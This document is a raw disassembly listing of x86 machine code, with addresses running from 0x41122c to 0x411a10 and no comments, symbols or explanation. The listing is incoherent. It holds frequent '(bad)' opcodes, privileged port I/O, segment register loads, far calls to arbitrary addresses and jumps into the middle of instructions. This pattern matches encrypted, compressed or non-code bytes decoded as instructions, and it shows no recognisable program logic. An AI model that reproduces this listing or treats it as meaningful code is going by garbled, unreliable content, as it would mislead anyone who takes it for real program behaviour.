  41122c:	aaa    
  41122d:	stos   DWORD PTR es:[edi],eax
  41122e:	fstp   st(1)
  411230:	mov    cl,0xec
  411232:	cmp    al,0xf7
  411234:	sbb    BYTE PTR [edx+0x22cfa4cf],dh
  41123a:	pop    es
  41123b:	and    ecx,esp
  41123d:	fsubr  st,st(1)
  41123f:	mov    ss,WORD PTR [esi-0x8cef8a]
  411245:	(bad)  [edx]
  411247:	sbb    BYTE PTR [esi+ecx*8+0x43],dh
  41124b:	mov    ebp,0xe1d8308a
  411250:	xchg   ecx,eax
  411251:	in     al,dx
  411252:	add    cl,BYTE PTR [edi-0x47880552]
  411258:	mov    fs,ebp
  41125a:	int    0xf1
  41125c:	sub    al,BYTE PTR gs:[ecx-0x5f2156a6]
  411263:	jns    0x41123f
  411265:	or     al,BYTE PTR [ebx-0x4c]
  411268:	xchg   esi,eax
  411269:	sbb    bh,ah
  41126b:	pop    edx
  41126c:	loopne 0x4111f2
  41126e:	adc    eax,0x90bd876d
  411273:	xor    ah,ch
  411275:	mov    DWORD PTR [ecx+0xc],edi
  411278:	fidivr DWORD PTR [edi-0x6ad4f08e]
  41127e:	cmp    al,0x3c
  411280:	pop    esp
  411281:	xor    DWORD PTR [ebx-0x60],ecx
  411284:	xor    DWORD PTR [ebp-0x76],ebp
  411287:	ds jge 0x4112dc
  41128a:	das    
  41128b:	aad    0xe9
  41128d:	xchg   ecx,eax
  41128e:	mov    ebx,0x60796f97
  411293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411294:	mov    ebx,0x10aa3320
  411299:	out    0x6e,al
  41129b:	mov    esi,cs
  41129d:	inc    ecx
  41129e:	mov    eax,0x13c800b3
  4112a3:	dec    esi
  4112a4:	lock jp 0x41130c
  4112a7:	lock sub cl,BYTE PTR [edi+0x52]
  4112ab:	bnd ja 0x411267
  4112ae:	xlat   BYTE PTR ds:[ebx]
  4112af:	xchg   ecx,eax
  4112b0:	imul   DWORD PTR [eax+ecx*8]
  4112b3:	push   ds
  4112b4:	xchg   esi,eax
  4112b5:	call   0x8cbe:0x6b985e9e
  4112bc:	inc    ebx
  4112bd:	or     ecx,DWORD PTR [edi-0x64]
  4112c0:	add    bl,BYTE PTR [ecx]
  4112c2:	and    DWORD PTR [ecx+0x1f2815b],edx
  4112c8:	dec    esi
  4112c9:	loope  0x41126a
  4112cb:	(bad)  
  4112cc:	clc    
  4112cd:	and    esi,DWORD PTR [eax-0x3bccbc35]
  4112d3:	arpl   bx,cx
  4112d5:	or     eax,0xdc5159c
  4112da:	mov    cl,BYTE PTR [edi]
  4112dc:	call   0x922da4ba
  4112e1:	sahf   
  4112e2:	scas   al,BYTE PTR es:[edi]
  4112e3:	add    eax,0x6316e486
  4112e8:	xor    DWORD PTR [eax],ebp
  4112ea:	leave  
  4112eb:	inc    eax
  4112ec:	pop    edi
  4112ed:	arpl   WORD PTR [edi+0x320b0db2],bp
  4112f3:	jecxz  0x411332
  4112f5:	in     al,dx
  4112f6:	jmp    0x4112c4
  4112f8:	lds    ecx,FWORD PTR [ebx+0x1c]
  4112fb:	test   al,0x8c
  4112fd:	test   al,0x6b
  4112ff:	mov    cs,WORD PTR [ecx-0x1cd6cab]
  411305:	inc    esi
  411306:	push   edx
  411307:	dec    esi
  411308:	iret   
  411309:	icebp  
  41130a:	add    BYTE PTR [edx],cl
  41130c:	in     eax,0x5e
  41130e:	jo     0x4112eb
  411310:	and    al,0x66
  411312:	sub    BYTE PTR [esi],dh
  411314:	push   ebx
  411315:	cmp    DWORD PTR [edx],esp
  411317:	jle    0x411389
  411319:	jl     0x4112d4
  41131b:	outs   dx,BYTE PTR ds:[esi]
  41131c:	ds mov edi,0xf9cff505
  411322:	pop    ds
  411323:	jle    0x4112d2
  411325:	lahf   
  411326:	dec    ecx
  411327:	not    BYTE PTR [ecx+0x5252c2e3]
  41132d:	sub    al,0xe9
  41132f:	sbb    al,0x1c
  411331:	or     BYTE PTR [eax-0x30911de4],cl
  411337:	jbe    0x411397
  411339:	popf   
  41133a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41133b:	outs   dx,DWORD PTR ds:[esi]
  41133c:	jmp    0x21bb3b00
  411341:	dec    esi
  411342:	push   edx
  411343:	sti    
  411344:	aaa    
  411345:	push   eax
  411346:	repnz bound edx,QWORD PTR [eax-0x5e]
  41134a:	dec    edx
  41134b:	arpl   WORD PTR [edx+0x1f],si
  41134e:	add    eax,0x3703e0b6
  411353:	cwde   
  411354:	mov    cl,0x8
  411356:	out    dx,eax
  411357:	and    bh,ah
  411359:	ja     0x4113a4
  41135b:	sub    cl,ah
  41135d:	in     al,0x8e
  41135f:	mov    edi,0xcb102caf
  411364:	mov    DWORD PTR [edx-0x65],ecx
  411367:	cmc    
  411368:	int3   
  411369:	sub    cl,BYTE PTR [ecx-0x2d]
  41136c:	push   eax
  41136d:	fisttp WORD PTR [eax+0x27f1d49b]
  411373:	stos   DWORD PTR es:[edi],eax
  411374:	dec    esp
  411375:	or     eax,0x35a57132
  41137a:	adc    ecx,ecx
  41137c:	aaa    
  41137d:	dec    eax
  41137e:	inc    esp
  41137f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411380:	into   
  411381:	in     eax,0x2c
  411383:	jle    0x411359
  411385:	and    cl,BYTE PTR [ebp-0x29b2619c]
  41138b:	and    ch,BYTE PTR [esp+ebp*1]
  41138e:	jo     0x411355
  411390:	sub    DWORD PTR [ecx+0x65],eax
  411393:	pop    es
  411394:	iret   
  411395:	inc    esi
  411396:	(bad)  [eax-0x4d]
  411399:	jle    0x411323
  41139b:	retf   
  41139c:	jae    0x411386
  41139e:	or     eax,0xb66b656e
  4113a3:	jb     0x411326
  4113a5:	mov    eax,0xb5692f8c
  4113aa:	mov    sp,0xb2d2
  4113ae:	push   0xffffffd7
  4113b0:	adc    bh,ch
  4113b2:	in     al,0x32
  4113b4:	xor    DWORD PTR [eax],0xe
  4113b7:	jecxz  0x4113b8
  4113b9:	or     edi,edi
  4113bb:	or     al,0xa1
  4113bd:	sar    BYTE PTR [esi+0x57687974],1
  4113c3:	sbb    BYTE PTR [edx+ebp*1],0x51
  4113c7:	and    dh,BYTE PTR [edi]
  4113c9:	aas    
  4113ca:	sahf   
  4113cb:	js     0x4113c1
  4113cd:	call   0x54203129
  4113d2:	sub    DWORD PTR [edi+ebp*4-0x2eda6cf5],0x48810864
  4113dd:	and    edx,DWORD PTR [eax-0x2c]
  4113e0:	jl     0x4113c2
  4113e2:	cmp    al,0xb3
  4113e4:	pop    esi
  4113e5:	lods   eax,DWORD PTR ds:[esi]
  4113e6:	leave  
  4113e7:	or     DWORD PTR [esi+edi*8-0x6b],eax
  4113eb:	ret    0x41db
  4113ee:	push   ebx
  4113ef:	das    
  4113f0:	popf   
  4113f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113f2:	aaa    
  4113f3:	retf   
  4113f4:	lea    esi,[eax-0x72]
  4113f7:	fld    QWORD PTR [eax-0xcdee823]
  4113fd:	pop    esi
  4113fe:	push   ebp
  4113ff:	(bad)  
  411400:	in     eax,0xfe
  411402:	jge    0x411426
  411404:	mov    dl,0x5
  411406:	pop    es
  411407:	push   0x54
  411409:	scas   al,BYTE PTR es:[edi]
  41140a:	stc    
  41140b:	in     al,0xe
  41140d:	pop    es
  41140e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41140f:	hlt    
  411410:	inc    esi
  411411:	outs   dx,BYTE PTR ds:[esi]
  411412:	mov    ah,0xd4
  411414:	sbb    DWORD PTR [edx-0x1b0e7169],edi
  41141a:	out    0x42,al
  41141c:	mov    esp,0xa562edc4
  411421:	mov    bl,0xc2
  411423:	adc    DWORD PTR [esi+0xd6ae596],ebx
  411429:	(bad)  
  41142a:	in     al,0x37
  41142c:	jge    0x4113e9
  41142e:	(bad)  
  411430:	mov    al,0x88
  411432:	or     dh,bl
  411434:	imul   esi,ecx,0xffffff8a
  411437:	fsubr  DWORD PTR [edi-0x4]
  41143a:	push   eax
  41143b:	xchg   ebp,eax
  41143c:	daa    
  41143d:	jbe    0x411425
  41143f:	call   0xcceac121
  411444:	push   ss
  411445:	dec    ecx
  411446:	sbb    eax,0x5c35556f
  41144b:	or     DWORD PTR [eax+0x5e],eax
  41144e:	test   eax,0x1910d7bc
  411453:	dec    eax
  411454:	mov    ss,WORD PTR [ebp-0x1a37a7a7]
  41145a:	mov    eax,ds:0xc8e9f759
  41145f:	repz ret 
  411461:	xor    al,0x4f
  411463:	add    ecx,DWORD PTR [esi]
  411465:	jmp    0x41142c
  411467:	mov    ds:0x425d1b19,al
  41146c:	or     edi,0xffffffd7
  41146f:	in     eax,0xa5
  411471:	fldcw  WORD PTR [eax]
  411473:	aad    0xfd
  411475:	jge    0x411490
  411477:	stc    
  411478:	mov    dh,BYTE PTR [ebp+ebx*4+0x17]
  41147c:	sbb    BYTE PTR [esi+eiz*2+0x4147829a],dl
  411483:	je     0x411449
  411485:	cmp    al,0x59
  411487:	adc    BYTE PTR [edx+0xf090635],al
  41148d:	mov    esp,DWORD PTR [ecx+0x5f748c9f]
  411493:	dec    esp
  411494:	sbb    al,0xe5
  411496:	jnp    0x41144f
  411498:	cdq    
  411499:	loopne 0x41147f
  41149b:	jmp    0x4114f0
  41149d:	enter  0xf31a,0xa7
  4114a1:	sbb    cl,cl
  4114a3:	xlat   BYTE PTR ds:[ebx]
  4114a4:	pop    edx
  4114a5:	jecxz  0x4114c1
  4114a7:	push   ds
  4114a8:	outs   dx,BYTE PTR ds:[esi]
  4114a9:	getsec 
  4114ab:	cdq    
  4114ac:	lds    esi,FWORD PTR [ebp-0x71]
  4114af:	pop    ebp
  4114b0:	rcl    ebp,cl
  4114b2:	cmc    
  4114b3:	xor    ebx,DWORD PTR [edi+0x30498c82]
  4114b9:	sub    ch,BYTE PTR [eax]
  4114bb:	(bad)  
  4114bc:	push   cs
  4114bd:	xor    DWORD PTR [esi+ecx*1+0x3994a2a7],edi
  4114c4:	jbe    0x4114ec
  4114c6:	or     eax,0x6f87d837
  4114cb:	(bad)  
  4114cc:	mov    ds:0x2f683256,eax
  4114d1:	fwait
  4114d2:	sbb    BYTE PTR [edi+0x1e],dl
  4114d5:	inc    esi
  4114d6:	rol    DWORD PTR [edx+0x8],cl
  4114d9:	lahf   
  4114da:	stos   DWORD PTR es:[edi],eax
  4114db:	jne    0x411526
  4114dd:	mov    bl,0x16
  4114df:	or     BYTE PTR [ebx],0xa0
  4114e2:	(bad)  
  4114e3:	fistp  QWORD PTR [esi+ebx*1+0x22]
  4114e7:	mov    ebx,0x59e1cfa
  4114ec:	xor    eax,0xa428901e
  4114f1:	adc    eax,0x4257f573
  4114f6:	out    0xe6,eax
  4114f8:	jb     0x411511
  4114fa:	cli    
  4114fb:	and    BYTE PTR [eax-0x23042608],bl
  411501:	mov    ebp,0x94f0cc09
  411506:	inc    esp
  411507:	dec    esp
  411508:	and    DWORD PTR [ebp-0x5ba2daad],edi
  41150e:	dec    BYTE PTR [esp+edi*8-0x521ae255]
  411515:	ror    al,0xa5
  411518:	sbb    edi,edx
  41151a:	adc    al,0x10
  41151c:	es inc edi
  41151e:	mov    edi,0x95750ac1
  411523:	jo     0x4114fe
  411525:	push   cs
  411526:	ss inc eax
  411528:	dec    edi
  411529:	iret   
  41152a:	sub    BYTE PTR [ebp+0x3d87eb1a],bh
  411530:	add    eax,0x4704a6c1
  411535:	(bad)  
  411536:	ja     0x411518
  411538:	pusha  
  411539:	into   
  41153a:	out    0x8e,eax
  41153c:	pop    edi
  41153d:	xchg   edx,eax
  41153e:	outs   dx,DWORD PTR ds:[esi]
  41153f:	lods   eax,DWORD PTR ds:[esi]
  411540:	sbb    eax,0x3d42c712
  411545:	jns    0x4114d1
  411547:	adc    al,0x2f
  411549:	sbb    ecx,DWORD PTR [edi+0x57c384db]
  41154f:	repz popa 
  411551:	xor    eax,esp
  411553:	outs   dx,BYTE PTR ds:[esi]
  411554:	rcl    BYTE PTR [ebx],0xc2
  411557:	push   ss
  411558:	retf   0x6abe
  41155b:	out    dx,al
  41155c:	cld    
  41155d:	lds    ebx,FWORD PTR [eax+eax*2-0x4c]
  411561:	test   BYTE PTR [edx+0x4b0fc128],bl
  411567:	(bad)  
  411568:	ficom  WORD PTR [esi+0x2a]
  41156b:	nop
  41156c:	mov    ch,BYTE PTR [esi]
  41156e:	das    
  41156f:	xchg   BYTE PTR [edx-0x40bdc899],bl
  411575:	call   0x9449:0xf123a392
  41157c:	retf   0x470f
  41157f:	ror    DWORD PTR [ebx+0x16],cl
  411582:	stc    
  411583:	sub    dh,BYTE PTR [ecx]
  411585:	xor    al,0xfc
  411587:	push   ebp
  411588:	mov    esi,0xb9387f58
  41158d:	xlat   BYTE PTR ds:[ebx]
  41158e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41158f:	xor    bh,cl
  411591:	shl    BYTE PTR [esp+ebp*4+0x234fe591],1
  411598:	add    DWORD PTR [edi],ebx
  41159a:	mov    WORD PTR [esi-0x6de1fabe],gs
  4115a0:	(bad)  
  4115a1:	jmp    0x411571
  4115a3:	push   eax
  4115a4:	mov    cl,0x50
  4115a6:	sub    BYTE PTR [eax+0x40172b52],0x87
  4115ad:	cmp    al,bl
  4115af:	mov    ?,WORD PTR [esi+0x6204a20a]
  4115b5:	fild   QWORD PTR [esi-0x2e78bbd5]
  4115bb:	or     BYTE PTR [eax-0x46],bh
  4115be:	test   DWORD PTR [edx+eax*1],ecx
  4115c1:	jmp    0x25dc:0x5931d98a
  4115c8:	sub    ah,BYTE PTR [edx+0x70f0e1eb]
  4115ce:	xor    al,0x35
  4115d0:	jg     0x411554
  4115d2:	xor    edx,DWORD PTR [ebx*4+0x6c87856d]
  4115d9:	mov    dh,0x38
  4115db:	sbb    DWORD PTR ds:0x6535d77d,esi
  4115e1:	xor    DWORD PTR [edi-0x6e],eax
  4115e4:	shl    DWORD PTR [edi],cl
  4115e6:	(bad)  
  4115e7:	sbb    eax,0xa4c2b669
  4115ec:	adc    BYTE PTR [eax+0x5c7abf39],dh
  4115f2:	das    
  4115f3:	js     0x4115b9
  4115f5:	sub    esi,DWORD PTR [esi-0x6]
  4115f8:	and    ecx,DWORD PTR [edx-0x4a]
  4115fb:	inc    esi
  4115fc:	sub    al,0xba
  4115fe:	xor    al,0x57
  411600:	or     DWORD PTR [ebp+0x79],ecx
  411603:	adc    esp,DWORD PTR [edi-0x5a147952]
  411609:	push   ebp
  41160a:	cdq    
  41160b:	adc    esi,ebp
  41160d:	push   esp
  41160e:	dec    esi
  41160f:	cmp    al,0x2d
  411611:	fild   WORD PTR es:[ecx+0x5d]
  411615:	sbb    BYTE PTR [edx],ah
  411617:	sbb    ah,dl
  411619:	push   esi
  41161a:	mov    ebx,0x28f73809
  41161f:	loopne 0x4115ad
  411621:	stc    
  411622:	and    ah,dl
  411624:	xchg   edx,eax
  411625:	jo     0x4115e6
  411627:	clc    
  411628:	cmp    eax,0xe9ac383
  41162d:	retf   
  41162e:	scas   eax,DWORD PTR es:[edi]
  41162f:	mov    esi,0x2d8d5323
  411634:	les    ebp,FWORD PTR [ebp-0x55b81125]
  41163a:	ja     0x411675
  41163c:	imul   ecx,DWORD PTR ds:[ebx],0xa2b4811a
  411643:	dec    ebp
  411644:	push   0xffffffd4
  411646:	call   0x58e7:0x312c7a4d
  41164d:	aam    0x5c
  41164f:	jmp    0x967f886e
  411654:	aas    
  411655:	fsubr  QWORD PTR [edx+0x51]
  411658:	push   ds
  411659:	cmp    ebp,DWORD PTR [esi]
  41165b:	jns    0x41167c
  41165d:	int    0x8b
  41165f:	dec    dx
  411661:	mov    ebx,0x5cd0bc9f
  411666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411667:	mov    cl,0xa2
  411669:	dec    ebp
  41166a:	inc    edi
  41166b:	cmp    BYTE PTR [ebx-0x11b71faf],0x19
  411672:	cwde   
  411673:	je     0x4116b9
  411675:	pop    es
  411676:	sub    dl,BYTE PTR [ebx]
  411678:	jp     0x41162c
  41167a:	xchg   dl,cl
  41167c:	cdq    
  41167d:	jmp    0xea91f493
  411682:	call   0x71c9d3c8
  411687:	sub    al,0x23
  411689:	xchg   ebx,eax
  41168a:	sub    BYTE PTR [edx],al
  41168c:	mul    BYTE PTR [eax-0x2f]
  41168f:	fldcw  WORD PTR [ebp-0x706fec4f]
  411695:	jl     0x411678
  411697:	stos   DWORD PTR es:[edi],eax
  411698:	mov    al,ds:0x26bfd2de
  41169d:	and    BYTE PTR [eax-0x7a3ee266],bh
  4116a3:	clc    
  4116a4:	adc    ebp,DWORD PTR [eax]
  4116a6:	mov    ecx,0xcfcd7500
  4116ab:	out    0x37,eax
  4116ad:	sub    ecx,ecx
  4116af:	cmp    dl,BYTE PTR ds:0x2cd1d017
  4116b5:	nop
  4116b6:	pop    ebp
  4116b7:	in     eax,0x74
  4116b9:	bound  ebx,QWORD PTR [ebx]
  4116bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116bc:	aaa    
  4116bd:	sbb    BYTE PTR [eax],al
  4116bf:	jno    0x4116cd
  4116c1:	inc    esp
  4116c2:	mov    eax,0xeb852b80
  4116c7:	jb     0x64374457
  4116cd:	inc    ebp
  4116ce:	dec    ebx
  4116cf:	sbb    al,0x87
  4116d1:	popf   
  4116d2:	ja     0x41172c
  4116d4:	dec    edx
  4116d5:	mov    BYTE PTR [eax-0x27],bl
  4116d8:	jae    0x411701
  4116da:	jg     0x4116bf
  4116dc:	jg     0x41166b
  4116de:	sahf   
  4116df:	xchg   ebx,eax
  4116e0:	not    DWORD PTR [ebp+0x14400489]
  4116e6:	ss cmc 
  4116e8:	push   esi
  4116e9:	loopne 0x411750
  4116eb:	les    edi,FWORD PTR [ebp-0xe02b9a9]
  4116f1:	fisttp DWORD PTR [ebp+edx*1-0x6b6a7962]
  4116f8:	cmp    al,0x23
  4116fa:	arpl   WORD PTR [eax],bx
  4116fc:	loopne 0x411681
  4116fe:	(bad)  [eax]
  411700:	pusha  
  411701:	in     al,dx
  411702:	pushf  
  411703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411704:	cmp    ebx,DWORD PTR [eax-0x4cc0757f]
  41170a:	(bad)
  41170d:	psllw  mm6,QWORD PTR [ecx-0x4e]
  411711:	(bad)  
  411712:	inc    edi
  411713:	mov    eax,0xdee79c4c
  411718:	(bad)  
  41171a:	ss pushf 
  41171c:	or     eax,0xda20c8c0
  411721:	into   
  411722:	jle    0x4116af
  411724:	add    edi,0xffffffe6
  411727:	xor    eax,DWORD PTR [edi]
  411729:	inc    esi
  41172a:	mov    ebp,0xbad23698
  41172f:	lock mov ecx,0x8c8668c4
  411735:	inc    edi
  411736:	or     al,BYTE PTR [edx+0x188bebd6]
  41173c:	rcl    BYTE PTR [esi+0x9cb5de4],1
  411742:	shl    dl,0xbf
  411745:	and    BYTE PTR ds:0xd2a9e21,ch
  41174b:	xchg   ebp,eax
  41174c:	int3   
  41174d:	loope  0x4116fa
  41174f:	xchg   edx,eax
  411750:	jns    0x41175c
  411752:	mov    edi,0x424f61f1
  411757:	ret    0x9530
  41175a:	les    esp,FWORD PTR [ecx+ebp*8-0x4]
  41175e:	ins    DWORD PTR es:[edi],dx
  41175f:	shr    BYTE PTR fs:[edi],1
  411762:	js     0x411764
  411764:	dec    ebx
  411765:	xchg   DWORD PTR es:[ebx],ecx
  411768:	jmp    0x41170f
  41176a:	jo     0x41174c
  41176c:	jno    0x411759
  41176e:	je     0x41170f
  411770:	xchg   esi,eax
  411771:	enter  0x5b7,0x50
  411775:	xchg   DWORD PTR [esp+ecx*4],edi
  411778:	lea    ebp,[ebx+0x43]
  41177b:	int3   
  41177c:	pop    ecx
  41177d:	imul   ecx,DWORD PTR [edi-0x2461e42a],0xcaabc34d
  411787:	push   cs
  411788:	ins    DWORD PTR es:[edi],dx
  411789:	lods   al,BYTE PTR ds:[esi]
  41178a:	cmc    
  41178b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41178c:	imul   ebp,ebx,0xffffffa5
  41178f:	lods   al,BYTE PTR ds:[esi]
  411790:	pop    ds
  411791:	fimul  DWORD PTR [edx-0x16344eb]
  411797:	cmp    eax,0x400d188f
  41179c:	out    0x9,eax
  41179e:	ins    BYTE PTR es:[edi],dx
  41179f:	inc    ebx
  4117a0:	iret   
  4117a1:	and    DWORD PTR [ecx-0x7b],edi
  4117a4:	ins    BYTE PTR es:[edi],dx
  4117a5:	out    dx,eax
  4117a6:	leave  
  4117a7:	scas   al,BYTE PTR es:[edi]
  4117a8:	sbb    eax,0xa3b30a1a
  4117ad:	repz xor edx,DWORD PTR [ecx+0x183670db]
  4117b4:	int    0xd2
  4117b6:	pusha  
  4117b7:	addr16 int3 
  4117b9:	rcr    DWORD PTR [ebx],1
  4117bb:	out    0xba,al
  4117bd:	outs   dx,DWORD PTR ds:[esi]
  4117be:	add    al,0x1d
  4117c0:	repz pop ebx
  4117c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117c3:	push   esi
  4117c4:	xor    DWORD PTR [ebx+0x30],0xffffff87
  4117c8:	push   ds
  4117c9:	pop    ecx
  4117ca:	mov    ds,WORD PTR [ebx+ebp*2]
  4117cd:	inc    esp
  4117ce:	push   ss
  4117cf:	pop    eax
  4117d0:	push   ds
  4117d1:	shl    dl,1
  4117d3:	add    bh,BYTE PTR [edi+0x75]
  4117d6:	xchg   ecx,eax
  4117d7:	dec    eax
  4117d8:	scas   eax,DWORD PTR es:[edi]
  4117d9:	fidiv  WORD PTR [edx]
  4117db:	cmp    esi,ecx
  4117dd:	sbb    DWORD PTR [ecx],edx
  4117df:	mov    ebx,0xc093a8c3
  4117e4:	mov    esi,0x98d44706
  4117e9:	xor    ah,cl
  4117eb:	pop    esi
  4117ec:	retf   
  4117ed:	mov    cl,0xa
  4117ef:	inc    ebp
  4117f0:	add    dh,dl
  4117f2:	or     ah,BYTE PTR [ebx+0x31]
  4117f5:	pop    es
  4117f6:	test   al,0x8d
  4117f8:	ins    DWORD PTR es:[edi],dx
  4117f9:	push   es
  4117fa:	loopne 0x411820
  4117fc:	nop
  4117fd:	push   esp
  4117fe:	lods   eax,DWORD PTR ds:[esi]
  4117ff:	pop    ss
  411800:	stc    
  411801:	idiv   eax
  411803:	mov    ah,ch
  411805:	dec    ecx
  411806:	xchg   BYTE PTR [eax+0x12cbe77e],cl
  41180c:	hlt    
  41180d:	mov    DWORD PTR [si],ecx
  411810:	mov    ds:0xe7016d2d,al
  411815:	push   ds
  411816:	xchg   edi,eax
  411817:	mov    al,ds:0x848b10f7
  41181c:	in     eax,0xb9
  41181e:	adc    BYTE PTR [esi],bl
  411820:	jecxz  0x4117e4
  411822:	daa    
  411823:	inc    eax
  411824:	sbb    ebx,DWORD PTR [edx-0x142936de]
  41182a:	xor    DWORD PTR [eax-0x52e7a43c],ecx
  411830:	cmp    BYTE PTR [edi+0x1fd03b9f],dl
  411836:	fwait
  411837:	pop    esp
  411838:	out    0xb3,eax
  41183a:	jmp    0x4117c0
  41183c:	push   0xffffff98
  41183e:	and    eax,0x355657d1
  411843:	ds gs or bl,bh
  411847:	push   eax
  411848:	push   es
  411849:	out    0x8c,eax
  41184b:	inc    ebx
  41184c:	or     ecx,DWORD PTR [ecx]
  41184e:	adc    eax,0x7a212853
  411853:	rcl    BYTE PTR ds:0xe5742331,0x11
  41185a:	call   0x96397a5a
  41185f:	push   ecx
  411860:	mov    ch,0xe7
  411862:	stos   BYTE PTR es:[edi],al
  411863:	or     eax,0x830add9d
  411868:	ror    ecx,cl
  41186a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41186b:	cs sbb al,0xef
  41186e:	mov    eax,ds:0xf96a5214
  411873:	imul   ebp,edi,0xfe3a81aa
  411879:	mov    ah,0xf4
  41187b:	data16 adc al,0x8f
  41187e:	adc    BYTE PTR [ebx-0x7d0291c],cl
  411884:	rol    BYTE PTR [edi],1
  411886:	or     DWORD PTR [edx+edx*8-0x142b1a22],0x34456b48
  411891:	sbb    edx,0xffffffb5
  411894:	ror    esp,cl
  411896:	and    BYTE PTR [eax],ch
  411898:	dec    ecx
  411899:	out    dx,al
  41189a:	ins    BYTE PTR es:[edi],dx
  41189b:	lea    ebp,[ebx+0x9]
  41189e:	and    bh,BYTE PTR [eax+0x36b48743]
  4118a4:	mov    al,0xba
  4118a6:	repz cmp esi,ebp
  4118a9:	dec    esp
  4118aa:	dec    esp
  4118ab:	mov    ch,0x16
  4118ad:	inc    eax
  4118ae:	inc    ebx
  4118af:	mov    esi,0x6aea783e
  4118b4:	scas   eax,DWORD PTR es:[edi]
  4118b5:	ja     0x41191e
  4118b7:	cmp    DWORD PTR [edx+edx*8-0x6b8537f0],0xc266a5d
  4118c2:	push   0x41
  4118c4:	cmp    ebx,0x9de35b0c
  4118ca:	inc    ecx
  4118cb:	(bad)
  4118d0:	lods   eax,DWORD PTR ds:[esi]
  4118d1:	loope  0x41185c
  4118d3:	fcom   QWORD PTR [eax]
  4118d5:	push   ss
  4118d6:	xor    dl,BYTE PTR [ebp+0x7b]
  4118d9:	scas   eax,DWORD PTR es:[edi]
  4118da:	(bad)  
  4118db:	les    edx,FWORD PTR [esi-0x8]
  4118de:	fistp  QWORD PTR ds:0xe83b496b
  4118e5:	sbb    ebx,DWORD PTR [edi-0x48]
  4118e8:	mov    al,ds:0x92d8d205
  4118ed:	arpl   WORD PTR [edi],di
  4118ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118f0:	pop    esp
  4118f1:	mov    al,ds:0x4bdb4588
  4118f6:	or     DWORD PTR [ecx+0x679d12f7],ebp
  4118fc:	jmp    0x4118b3
  4118fe:	hlt    
  4118ff:	iret   
  411900:	push   cs
  411901:	cmp    eax,0x7f587f4d
  411906:	mov    ebx,0xf5cb148f
  41190b:	je     0x4118b7
  41190d:	push   esi
  41190e:	js     0x411958
  411910:	cs cwde 
  411912:	pop    ss
  411913:	nop
  411914:	sbb    ebp,DWORD PTR [ebx-0x7cef91a2]
  41191a:	jle    0x411933
  41191c:	fild   WORD PTR [ebp-0x206ad9ad]
  411922:	lahf   
  411923:	or     al,0xcf
  411925:	sbb    eax,0xe167c86b
  41192a:	push   ss
  41192b:	mov    edx,0x59df5398
  411930:	arpl   WORD PTR [edi],dx
  411932:	mov    ds:0xf96464e2,eax
  411937:	scas   eax,DWORD PTR es:[edi]
  411938:	pop    ecx
  411939:	mov    dh,0xea
  41193b:	mov    esp,0x5bb4dfcd
  411940:	retf   0xed92
  411943:	pop    es
  411944:	fist   DWORD PTR ds:0xaebfb15c
  41194a:	and    ch,al
  41194c:	or     ah,BYTE PTR [edi+0x3f]
  41194f:	fwait
  411950:	pop    ecx
  411951:	jne    0x4118ee
  411953:	mov    bh,0xba
  411955:	test   eax,0x6e353539
  41195a:	xchg   eax,edi
  41195c:	cmp    BYTE PTR [ebp-0xf],al
  41195f:	mov    dl,0xe7
  411961:	cmp    al,0x94
  411963:	mov    eax,0x87c7430b
  411968:	cmp    bh,dh
  41196a:	or     DWORD PTR [ecx],eax
  41196c:	jmp    FWORD PTR [ebx-0x3d]
  41196f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411970:	xlat   BYTE PTR ds:[ebx]
  411971:	sbb    ebp,eax
  411973:	fadd   DWORD PTR [edi+0x766ef135]
  411979:	mov    esp,0x9a011014
  41197e:	int3   
  41197f:	lock scas al,BYTE PTR es:[edi]
  411981:	arpl   WORD PTR ds:[esi],ax
  411984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411985:	or     BYTE PTR [edi+0x5],dh
  411988:	(bad)  
  411989:	out    dx,eax
  41198a:	imul   DWORD PTR ds:0x8520fa7c
  411990:	xor    DWORD PTR [eax+0x52436dc5],edx
  411996:	pop    ds
  411997:	sahf   
  411998:	jecxz  0x4119de
  41199a:	in     eax,dx
  41199b:	outs   dx,DWORD PTR ds:[esi]
  41199c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41199d:	jl     0x411a12
  41199f:	std    
  4119a0:	mov    cl,0xd8
  4119a2:	ror    DWORD PTR [edi+0x5bf7afbe],1
  4119a8:	xor    dh,BYTE PTR [eax-0x7429796]
  4119ae:	add    eax,0xd097bfd3
  4119b3:	cmp    DWORD PTR [edi-0x4f6639cb],0x3
  4119ba:	fwait
  4119bb:	push   cs
  4119bc:	cld    
  4119bd:	add    al,BYTE PTR [edi+0x20]
  4119c0:	xchg   ch,dl
  4119c2:	xor    edi,DWORD PTR [ecx-0xf90608d]
  4119c8:	outs   dx,BYTE PTR ds:[esi]
  4119c9:	add    eax,0x8eea318d
  4119ce:	(bad)  
  4119cf:	popa   
  4119d0:	dec    edx
  4119d1:	cwde   
  4119d2:	adc    esp,DWORD PTR [ebx-0x19810968]
  4119d8:	rcr    DWORD PTR ds:0x5ff3608c,0x14
  4119df:	sub    ebx,DWORD PTR [edi-0x7c]
  4119e2:	bound  ebp,QWORD PTR [esi+0x48b7c24b]
  4119e8:	pop    esp
  4119e9:	cs pop edi
  4119eb:	mov    eax,ds:0x69cc2766
  4119f0:	add    BYTE PTR [edi],0xef
  4119f3:	push   cs
  4119f4:	sbb    al,0xca
  4119f6:	or     ebx,ebp
  4119f8:	jns    0x411a28
  4119fa:	in     al,dx
  4119fb:	loop   0x4119cc
  4119fd:	ret    
  4119fe:	mov    edi,0x586f3bca
  411a03:	popf   
  411a04:	mov    al,ds:0xb2f9c7f6
  411a09:	sti    
  411a0a:	or     eax,0xfb5ae07e
  411a0f:	cld    
  411a10:	inc    ebp
